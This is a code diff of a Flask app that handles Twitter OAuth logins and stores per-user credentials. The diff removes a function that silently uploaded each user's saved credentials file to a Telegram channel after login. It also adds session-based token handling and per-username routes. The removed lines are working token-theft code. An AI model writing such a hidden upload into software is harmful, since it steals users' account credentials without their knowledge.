@@ -3,7 +3,7 @@ import os
 import requests
 from requests_oauthlib import OAuth1Session
 from dotenv import load_dotenv
-from flask import Flask, request, redirect, url_for
+from flask import Flask, request, redirect, url_for, session
 
 # Load environment variables from .env file
 load_dotenv()
@@ -46,25 +46,6 @@ def are_tokens_valid(credentials):
     response = oauth.get("https://api.twitter.com/1.1/account/verify_credentials.json")
     return response.status_code == 200
 
-# Send file to Telegram channel
-def send_file_to_telegram(file_path):
-    TELEGRAM_BOT_TOKEN = get_env_variable('TELEGRAM_BOT_TOKEN')
-    TELEGRAM_CHANNEL_ID = get_env_variable('TELEGRAM_CHANNEL_ID')
-    
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-    with open(file_path, 'rb') as file:
-        payload = {
-            'chat_id': TELEGRAM_CHANNEL_ID
-        }
-        files = {
-            'document': file
-        }
-        response = requests.post(url, data=payload, files=files)
-        if response.status_code == 200:
-            print("File sent successfully to Telegram.")
-        else:
-            print(f"Failed to send file to Telegram. Status code: {response.status_code}, Response: {response.text}")
-
 # Re-authenticate the user if tokens are invalid or missing
 def re_authenticate_user(username):
     consumer_key = get_env_variable("CONSUMER_KEY")
@@ -78,9 +59,10 @@ def re_authenticate_user(username):
         resource_owner_key = fetch_response.get("oauth_token")
         resource_owner_secret = fetch_response.get("oauth_token_secret")
         
-        authorization_url = oauth.authorization_url("https://api.twitter.com/oauth/authorize")
-        print(f"Redirecting {username} to authorize the app: {authorization_url}")
+        session[f"{username}_resource_owner_key"] = resource_owner_key
+        session[f"{username}_resource_owner_secret"] = resource_owner_secret
         
+        authorization_url = oauth.authorization_url("https://api.twitter.com/oauth/authorize")
         return redirect(authorization_url)
     
     except Exception as e:
@@ -92,10 +74,14 @@ def handle_callback(oauth_token, oauth_verifier, username):
     consumer_key = get_env_variable("CONSUMER_KEY")
     consumer_secret = get_env_variable("CONSUMER_SECRET")
     
+    resource_owner_key = session.get(f"{username}_resource_owner_key")
+    resource_owner_secret = session.get(f"{username}_resource_owner_secret")
+    
     oauth = OAuth1Session(
         consumer_key,
         client_secret=consumer_secret,
-        resource_owner_key=oauth_token
+        resource_owner_key=resource_owner_key,
+        resource_owner_secret=resource_owner_secret
     )
     
     try:
@@ -111,10 +97,6 @@ def handle_callback(oauth_token, oauth_verifier, username):
         }
         save_credentials(username, credentials)
         
-        # Send the saved credentials file to Telegram
-        credentials_file_path = os.path.join(CREDENTIALS_DIR, f"{username}_credentials.json")
-        send_file_to_telegram(credentials_file_path)
-        
         return credentials
     
     except Exception as e:
@@ -123,11 +105,14 @@ def handle_callback(oauth_token, oauth_verifier, username):
 
 # Flask app initialization
 app = Flask(__name__)
+app.secret_key = get_env_variable("SECRET_KEY")  # Ensure this is set in your .env file
 
 @app.route('/')
 def index():
-    username = "default_user"
-    
+    return "Welcome to the Twitter OAuth App. Please start authentication by visiting '/auth/<username>'."
+
+@app.route('/auth/<username>')
+def auth(username):
     credentials = load_credentials(username)
     if not credentials or not are_tokens_valid(credentials):
         # No valid tokens found, initiate re-authentication
@@ -135,12 +120,11 @@ def index():
     
     return f"User '{username}' is authenticated. Ready to access Twitter API."
 
-@app.route('/callback')
-def callback():
+@app.route('/callback/<username>')
+def callback(username):
     oauth_token = request.args.get('oauth_token')
     oauth_verifier = request.args.get('oauth_verifier')
     
-    username = "default_user"
     credentials = handle_callback(oauth_token, oauth_verifier, username)
     
     if credentials:
@@ -148,9 +132,8 @@ def callback():
     else:
         return "Failed to authenticate user."
 
-@app.route('/protected')
-def protected():
-    username = "default_user"
+@app.route('/protected/<username>')
+def protected(username):
     credentials = load_credentials(username)
     
     if credentials and are_tokens_valid(credentials):
@@ -163,7 +146,7 @@ def protected():
         response = oauth.get("https://api.twitter.com/1.1/account/verify_credentials.json")
         return response.json()
     
-    return redirect(url_for('index'))
+    return redirect(url_for('auth', username=username))
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
